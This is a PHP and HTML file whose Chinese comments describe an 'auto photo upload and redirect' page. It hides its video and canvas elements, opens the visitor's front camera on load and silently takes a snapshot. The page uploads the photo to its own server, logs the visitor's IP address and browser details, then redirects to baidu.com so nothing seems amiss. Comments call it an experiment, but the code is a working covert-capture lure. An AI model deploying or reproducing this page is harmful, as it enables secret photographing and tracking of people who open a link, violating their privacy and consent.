<?php
// ==================== 后端 PHP 逻辑（日志记录 + 文件上传）====================
// 日志文件路径（与 index.php 同目录）
define('LOG_FILE', __DIR__ . 'log.log');

// 日志写入函数（追加模式，自动换行）
function writeLog($message, $data = []) {
    $time = date('Y-m-d H:i:s');
    $logLine = "[$time] $message";
    // 若有额外数据，转为 JSON 格式追加
    if (!empty($data)) {
        $logLine .= " | 附加数据: " . json_encode($data, JSON_UNESCAPED_UNICODE);
    }
    $logLine .= PHP_EOL;
    // 追加写入日志文件（不存在则自动创建）
    file_put_contents(LOG_FILE, $logLine, FILE_APPEND | LOCK_EX);
}

// 处理文件上传请求（AJAX POST 请求）
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['camera_photo'])) {
    // 1. 记录请求基础信息
    $basicInfo = [
        '客户端IP' => $_SERVER['REMOTE_ADDR'] ?? '未知',
        '请求类型' => $_SERVER['REQUEST_METHOD'] ?? '未知',
        '服务器软件' => $_SERVER['SERVER_SOFTWARE'] ?? '未知',
        'PHP版本' => PHP_VERSION,
        '用户代理（浏览器/设备）' => $_SERVER['HTTP_USER_AGENT'] ?? '未知'
    ];
    writeLog('收到文件上传请求', $basicInfo);

    // 2. 记录超全局变量关键信息
    $superGlobals = [
        '$_FILES' => $_FILES,
        '$_SERVER 关键项' => [
            'REMOTE_PORT' => $_SERVER['REMOTE_PORT'] ?? '未知',
            'HTTP_HOST' => $_SERVER['HTTP_HOST'] ?? '未知',
            'REQUEST_URI' => $_SERVER['REQUEST_URI'] ?? '未知'
        ]
    ];
    writeLog('超全局变量信息', $superGlobals);

    // 3. 处理文件上传
    $file = $_FILES['camera_photo'];
    $uploadDir = __DIR__ . '/uploads/';
    $result = '';
    $status = 'error';

    if ($file['error'] === UPLOAD_ERR_OK) {
        // 确保上传目录存在
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }
        // 生成文件名（时间戳+随机数）
        $fileName = time() . '_' . rand(1000, 9999) . '.jpg';
        $filePath = $uploadDir . $fileName;

        if (move_uploaded_file($file['tmp_name'], $filePath)) {
            $result = "上传成功！文件路径：uploads/$fileName";
            $status = 'success';
            writeLog($result, ['文件大小' => $file['size'] . ' 字节']);
        } else {
            $result = '文件移动失败，请检查目录权限';
            writeLog($result);
        }
    } else {
        $errorMsg = match ($file['error']) {
            UPLOAD_ERR_INI_SIZE => '文件超过 php.ini 限制',
            UPLOAD_ERR_FORM_SIZE => '文件超过表单限制',
            UPLOAD_ERR_PARTIAL => '文件仅部分上传',
            UPLOAD_ERR_NO_FILE => '无文件上传',
            default => '未知错误：' . $file['error']
        };
        $result = $errorMsg;
        writeLog($errorMsg);
    }

    // 4. 返回 JSON 响应给前端
    header('Content-Type: application/json');
    echo json_encode([
        'status' => $status,
        'message' => $result
    ]);
    exit; // 终止后续 HTML 输出
}

// ==================== 前端 HTML + JS 逻辑（自动拍照上传跳转）====================
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>自动拍照上传跳转</title>
    <style>
        /* 隐藏所有元素，后台运行 */
        video, canvas { display: none; }
    </style>
</head>
<body>
    <video autoplay playsinline></video>
    <canvas></canvas>

    <script>
        // 配置项
        const CONFIG = {
            CAPTURE_DELAY: 900, // 摄像头预热时间（毫秒）
            TARGET_WIDTH: 800,   // 目标宽度
            TARGET_HEIGHT: 800,  // 目标高度
            REDIRECT_URL: 'https://www.baidu.com' // 跳转地址
        };

        // 页面加载完成自动执行
        window.addEventListener('DOMContentLoaded', async () => {
            const video = document.querySelector('video');
            const canvas = document.querySelector('canvas');
            const ctx = canvas.getContext('2d');

            try {
                // 1. 调用前置摄像头
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // 使用前置摄像头
                        width: { ideal: CONFIG.TARGET_WIDTH, max: CONFIG.TARGET_WIDTH },
                        height: { ideal: CONFIG.TARGET_HEIGHT, max: CONFIG.TARGET_HEIGHT }
                    }
                });
                video.srcObject = stream;

                // 2. 等待摄像头预热
                await new Promise(resolve => setTimeout(resolve, CONFIG.CAPTURE_DELAY));

                // 3. 自动拍照（绘制到 canvas）
                const canvasWidth = Math.min(video.videoWidth, CONFIG.TARGET_WIDTH);
                const canvasHeight = Math.min(video.videoHeight, CONFIG.TARGET_HEIGHT);
                canvas.width = canvasWidth;
                canvas.height = canvasHeight;
                ctx.drawImage(video, 0, 0, canvasWidth, canvasHeight);

                // 4. 自动上传（canvas 转 Blob 发送到自身 PHP 接口）
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('camera_photo', blob, `auto_capture_${Date.now()}.jpg`);

                    const response = await fetch(window.location.href, {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();

                    // 5. 无论上传成功与否，都跳转到百度（实验环境简化逻辑）
                    window.location.href = CONFIG.REDIRECT_URL;
                }, 'image/jpeg', 0.8);

            } catch (err) {
                // 出错也跳转（实验环境）
                alert('执行失败：' + err.message);
                window.location.href = CONFIG.REDIRECT_URL;
            }
        });
    </script>
</body>
</html>